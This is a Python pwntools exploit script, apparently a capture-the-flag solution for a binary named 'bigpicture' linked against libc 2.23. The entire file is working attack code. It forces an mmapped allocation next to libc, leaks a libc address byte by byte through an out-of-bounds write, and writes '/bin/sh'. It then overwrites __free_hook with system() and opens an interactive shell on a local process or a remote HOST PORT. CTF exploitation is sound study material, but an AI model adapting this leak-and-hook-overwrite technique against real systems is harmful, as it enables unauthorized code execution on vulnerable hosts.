import sys
from pwn import *


def write_qword(offset, value, prompt=True):
    log.info("Writing value {:#x}".format(value))
    write_byte(offset, value & 0xFF)
    write_byte(offset + 1, (value >> 8) & 0xFF, prompt)
    write_byte(offset + 2, (value >> 16) & 0xFF, prompt)
    write_byte(offset + 3, (value >> 24) & 0xFF, prompt)
    write_byte(offset + 4, (value >> 32) & 0xFF, prompt)
    write_byte(offset + 5, (value >> 40) & 0xFF, prompt)
    write_byte(offset + 6, (value >> 48) & 0xFF, prompt)
    write_byte(offset + 7, (value >> 56) & 0xFF, prompt)

def write_byte(offset, value, prompt=True):
    print(" 0 , {} , {}".format(offset, chr(value & 0xFF)))
    r.sendline(" 0 , {} , {}".format(offset, chr(value & 0xFF)))
    if prompt:
        r.recvuntil("> ", timeout=.5)

def leak_qword(offset, value):
    log.info("leaking: %x" % offset)
    leak = ''
    r.sendline(" 0 , {} , {}".format(offset, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+1, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+2, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+3, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+4, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+5, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+6, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    r.sendline(" 0 , {} , {}".format(offset+7, chr(value & 0xFF)))
    data = r.recvuntil('> ')
    if 'overwriting ' in data:
        leak += data.split('overwriting ')[1][0]
    else:
        leak += '\x00'
    return u64(leak)

def exploit():
    libc = ELF("./libc-2.23.so")
    r.sendlineafter("How big? ", " 1 x %d" % 0x21000)  # 139264 Alloc 0x21000 bytes, forcing mmapped alloc near libc

    libc_base = -0x5c1010
    free_hook_offset = libc_base + 0x3c57a8
    leak_ptr_offset = libc_base + 0x3c3af0

    # Leak out libc
    r.recvuntil("> ")

#    write_qword(leak_ptr_offset, 0x1, prompt=False)  # Wont overwrite anything
    libcb = leak_qword(leak_ptr_offset, 0x41) -0x3c2260
    libc.address = libcb
    
    log.info("Got libc address {:#x}".format(libc.address))
    # Write /bin/sh right at the start
    write_qword(0, u64("/bin/sh\x00"))

    # Overwrite __free_hook
    write_qword(free_hook_offset, libc.symbols["system"])
    # write_qword(free_hook_offset, 0x4141414141414141)
    # write_qword(free_hook_offset, libc.address + 0x4526a)
    # write_qword(free_hook_offset, libc.address + 0xcc543)
    # write_qword(free_hook_offset, libc.address + 0xcc618)
    # write_qword(free_hook_offset, libc.address + 0xef6c4)
    # write_qword(free_hook_offset, libc.address + 0xf0567)
    # write_qword(free_hook_offset, libc.address + 0xf5b10)
    pause()
    # Draw
    r.sendline("quit")

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit()
    else:
        r = process(["./bigpicture"], env={"LD_PRELOAD":"./libc-2.23.so"})
        log.info("PID: {}".format(util.proc.pidof(r)))
        pause()
        exploit()
